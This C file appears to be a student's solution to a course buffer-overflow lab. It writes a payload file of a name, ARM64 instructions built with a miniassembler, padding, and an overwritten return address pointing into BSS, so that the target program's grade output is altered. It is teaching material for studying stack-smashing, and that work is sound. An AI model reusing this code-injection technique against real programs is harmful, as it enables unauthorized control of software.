/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

int main() {
    size_t ulIndex; /* index for the loop */
    FILE *psFile; /* file */
    unsigned long ulAddrInMain = 0x40089c; /* address of grade printf */
    unsigned long ulAddrInBSS = 0x42005c; /* address of code in BSS */
    unsigned long ulAddrOfB = 0x420068; /* address of b instr */
    unsigned int uiInstr; /* stores each instruction getting added */
    
    /* create and open file dataB */
    psFile = fopen("dataB", "w");

    /* put names into file */
    fprintf(psFile, "%c", 'N');
    fprintf(psFile, "%c", '&');
    fprintf(psFile, "%c", 'T');
    fprintf(psFile, "%c", '\0'); /* terminating null byte */

    /* put mov instruction */
    uiInstr = MiniAssembler_mov(0, 'A');
    fprintf(psFile, "%lu", uiInstr);

    /* put strb instruction */
    uiInstr = MiniAssembler_strb(0, 1);
    fprintf(psFile, "%lu", uiInstr);

    /* put b instruction */
    uiInstr = MiniAssembler_b(ulAddrInMain, ulAddrOfB);
    fprintf(psFile, "%lu", uiInstr);

    /* fill remaining buffer */
    for (ulIndex = 0; ulIndex < (48 - 20); ulIndex++) {
        fprintf(psFile, "%c", '\0');
    }

    /* change x30 */
    fwrite(&ulAddrInBSS, sizeof(ulAddrInBSS), 1, psFile);
    return 0;
}
